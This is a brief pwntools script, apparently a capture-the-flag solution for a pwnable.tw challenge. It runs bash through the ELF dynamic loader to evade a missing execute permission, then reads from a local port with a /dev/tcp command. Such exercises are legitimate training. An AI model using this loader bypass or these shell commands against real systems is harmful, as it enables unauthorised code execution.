###Abuse loader to run ELF without x permission

from pwn import *

r = remote('chall.pwnable.tw',10108)

r.sendlineafter('bash-4.3$ ','/lib64/ld-linux-x86-64.so.2 /bin/bash')
r.sendline('cat < /dev/tcp/127.0.0.1/1337')
r.interactive()
